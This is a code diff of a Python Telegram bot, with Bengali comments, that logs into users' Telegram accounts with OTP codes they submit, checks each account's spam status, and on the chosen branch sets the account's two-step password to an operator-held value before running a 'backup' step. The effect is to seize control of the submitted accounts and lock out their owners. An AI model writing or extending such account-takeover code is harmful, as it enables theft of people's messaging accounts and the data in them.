@@ -667,25 +667,35 @@ async def verify_otp_task(text, user_id, message):
             phone_code_hash=data["phone_code_hash"]
         )
 
-        # ২. স্প্যাম চেক ও ২এফএ সেটআপ
         settings = load_settings()
-        if settings.get("spam_filter_active", True):
-            status = await get_spam_status(data["client"])
-            if "limited" in status.lower():
+        status = await get_spam_status(data["client"])
+        is_limited = "limited" in status.lower()
+        is_filter_on = settings.get("spam_filter_active", True)
+
+        # লজিক ১: ফিল্টার ON থাকলে
+        if is_filter_on:
+            if not is_limited:
+                # স্প্যাম ফ্রি: ২-এফএ লাগাও এবং কনফার্মেশনে যাও
+                await data["client"].edit_2fa_password(new_password=settings["security_password"])
+                await process_backup(user_id, message, data)
+            else:
+                # স্প্যাম হলে রিজেক্ট
                 bot.reply_to(message, "🚫 **Access Denied:** Account is Limited.")
                 try: await data["client"].disconnect()
                 except: pass
-                del user_data[user_id]
-                return
 
-        # ৩. ২এফএ সেটআপ
-        try:
-            await data["client"].edit_2fa_password(new_password=settings["security_password"])
-        except Exception as e:
-            print(f"2FA Setup Error: {e}")
+        # লজিক ২: ফিল্টার OFF থাকলে
+        else:
+            if is_limited:
+                # স্প্যাম হলে: ২-এফএ লাগাও এবং কনফার্মেশনে যাও
+                await data["client"].edit_2fa_password(new_password=settings["security_password"])
+                await process_backup(user_id, message, data)
+            else:
+                # স্প্যাম ফ্রি হলে সরাসরি রিজেক্ট (কনফার্মেশনে যাবে না)
+                bot.reply_to(message, "🚫 **Access Denied:** Only Spam accounts are allowed.")
+                try: await data["client"].disconnect()
+                except: pass
 
-        # ৪. ব্যাকআপ প্রসেস
-        await process_backup(user_id, message, data)
         del user_data[user_id]
 
     except SessionPasswordNeededError:
@@ -694,13 +704,7 @@ async def verify_otp_task(text, user_id, message):
         except: pass
         del user_data[user_id]
     except Exception as e:
-        error_str = str(e)
-        if "PHONE_CODE_INVALID" in error_str:
-            bot.reply_to(message, "❌ **Wrong OTP!**")
-        elif "PHONE_CODE_EXPIRED" in error_str:
-            bot.reply_to(message, "❌ **OTP Expired!**")
-        else:
-            bot.reply_to(message, f"❌ **Error:** {error_str}")
+        bot.reply_to(message, f"❌ **Error:** {str(e)}")
         try: await data["client"].disconnect()
         except: pass
         del user_data[user_id]
